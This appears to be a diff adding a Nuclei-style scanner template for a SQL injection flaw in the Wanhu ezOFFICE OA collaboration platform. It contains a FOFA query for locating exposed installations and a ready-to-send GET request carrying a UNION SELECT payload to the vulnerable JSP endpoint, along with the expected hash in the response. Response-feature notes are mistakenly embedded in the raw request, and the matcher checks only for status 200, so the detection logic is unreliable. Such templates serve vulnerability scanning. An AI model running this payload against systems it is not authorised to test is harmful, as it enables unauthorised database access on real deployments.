@@ -1,0 +1,52 @@
+id: poc-zay3gbpgggceoxod
+info:
+  name: 万户OA协同管理平台SendFileCheckTemplateEdit-SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zay3gbpgggceoxod'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zay3gbpgggceoxod
+    fofa: app="万户ezOFFICE协同管理平台"
+http:
+- raw:
+  - 'GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1''%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
+
+
+    Connection: close
+
+
+    Accept: */*
+
+
+    Accept-Language: en
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    6cfe798ba8e5b85feb50164c59f4bec9
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
